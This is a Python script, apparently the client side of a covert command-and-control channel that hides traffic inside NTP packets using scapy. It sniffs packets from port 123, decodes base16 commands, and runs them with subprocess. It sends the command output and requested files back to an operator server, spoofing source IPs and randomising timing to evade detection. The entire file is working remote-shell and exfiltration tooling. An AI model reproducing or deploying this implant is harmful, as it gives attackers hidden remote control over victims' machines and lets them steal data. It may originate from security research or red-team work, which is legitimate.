#!/usr/bin/env python

### LIBRARIES ###

from scapy.all import *
import threading, os, sys, socket, string, subprocess, re, base64, argparse, pty, time, random

#---Creates --help commands for arguments ---
parser = argparse.ArgumentParser(description='Client for NTP Covert C2 Channel.')
parser.add_argument('-s', '--server', metavar='N', type=str,
                    help='Server IP.')
parser.add_argument('-S', '--spoofip', metavar='N', nargs='?', type=str,
                    help='Spoof with specified first three Octects. EX. 192.168.1')
parser.add_argument('-p', '--port', metavar='N', type=int, default=50000,
                    help='Listening Port.')
parser.add_argument('-b', '--byte', metavar='N', type=int, default=12,
                    help='Bytes to use for response. 4-44 # 12 is default..')
parser.add_argument('-i', '--interval', metavar='N', type=int, default=10,
                    help='Interval time for client response ')
parser.add_argument('-H', '--header', metavar='N', type=str, default='\x23\x00\x00\x00',
                    help='Protocol Header. For example NTP client is 8 bytes: "\x23\x00\x00\x00"')
parser.add_argument('-pl', '--packetlen', metavar='N', type=int, default=44,
                    help='Packet length past header. Example 44 Bytes')
parser.add_argument('-dp', '--destport', metavar='N', type=int, default=123,
                    help='Destination Port. Example NTP is 123')
parser.add_argument('-pc', '--paddingchar', metavar='N', type=str, default="\x00",
                    help='Padding char in hex. For example: "\x00"')


### GLOBAL VARIABLES ###

#---argparse global variables
args = parser.parse_args()
ntp_srvip = args.server 
src_spfip = IP(dst='%s' % args.server)
src_spfip = '.'.join(str(src_spfip.src).split('.')[0:-1])
if args.spoofip:
        src_net = args.spoofip + '.'
else:
        src_net = src_spfip + '.'
port = args.port
byte = args.byte
intv = args.interval
header = args.header
plen = args.packetlen
dest_port = args.destport
pad = args.paddingchar
#---global variables
initial_payload = "\x6e\x74\x70\x5f\x5f\x73\x65\x72\x76\x65\x72\x5f\x0a\x3b\x3b\x3b" #Initial packet: "ntp__server__" + ";;;"     
EOL = ';;;' #End of Line delimeters                                                                                                                          
src_ip = '' 
upfile = ''  


### FUNCTIONS ###

#---Change the interval time of the clients response---
def fuzztime():
	x = random.randint(1,intv)
	time.sleep(x) #Sleeps for random interval

#---Creates and sends packet via scapy -> header & payload with adjusted padding---
def replyme(pyld):
	fuzztime() #---Changes the interval by which each encoded packet is sent by sleeping the process
	global port
	global src_ip
	global ntp_srvip	
	if port <= 1024: 
	        port = random.randint(10000,65535) #Randomizes the port by by which Scapy sends its packet
	global src_ip
	if ';;;' in pyld:
		s_ip =  IP(dst='%s' % ntp_srvip) # creates empty packet with destination of server and assigns it to s-ip
		src_ip = s_ip.src # the '.src' value for s_ip is the IP locally used to talk with the server
	else:
		src_ip = src_net + str(random.randrange(0,255,1)) #Randomizes the IP of client when it replies to server	
	#Structure of Scapy packet: NTP header + payload(input) + adjusted padding
	scapy_packet = IP(src=src_ip,dst=ntp_srvip)/UDP(dport=dest_port,sport=port)/(str(header) + str(pyld) + pad*(plen-len(pyld)))
	#Sending the packet via Scapy send() function
	send(scapy_packet, verbose=0)

### IMPLEMENTATION ###
#---Calling the function that sends the first packet
replyme(initial_payload)

filtered_array = []

def c2(packet):
	filtered_string = ''.join([x for x in str(packet[0]) if x in string.printable])
        global filtered_array
        global upfile
        filtered_string = str(filtered_string).split('\x24') # Delimiting by $ as we need to take the header off
        if len(filtered_string) > 1:
                filtered_array.append(str(filtered_string[1]))
	for i in filtered_array:
		if EOL in i:
			#---The array contents are converted to string variables with 'map'
			cmd_string = ''.join(map(str, filtered_array[:-1]))
			try:
				cmd_string = base64.b16decode(cmd_string)
			except:
				break

			filtered_array = []

			if cmd_string == '':
				cmd_string = 'echo " "'
			if cmd_string.split(' ')[0] == 'download': #---If the command from the ntpserver is download
				cmd_string = 'cat ' + cmd_string.split(' ')[1] #---Concatenate the string following download, e.g.'anaconda-ks.cfg'
				upfile = 'upfile' #---String that will be attached to file in the argument
			cmd_output = subprocess.getstatusoutput(cmd_string) #---Makes the string input an actual command in terminal
			#---Parses only for output of command and splits it by carriage return
			cmd_output = str(cmd_output[1]).split('\n') #---Contains the actual output of cmd_string
			###If the file has the string 'upfile'; they have selected 'download'
			if upfile:
				#---Prepend cmd_output with value of upfile
				cmd_output = [upfile] + cmd_output
				upfile = ''
			for i in cmd_output: 
				i = i + "\n" #---Adds a newline to the output(strings) line by line
				encoded_data = base64.b16encode(i) #---Encodes each output string
				message = re.findall('.{1,%d}' % byte, encoded_data) #---Split i by BYTE characters in length and places it in an array
				for x in message: #---Looping through an array of encoded strings 
					replyme(x) #---Sends packet to ntpserver via Scapy
			replyme(';;;') #---Insert the EOL in order to end the command

sniff(filter='src port 123', prn=c2)
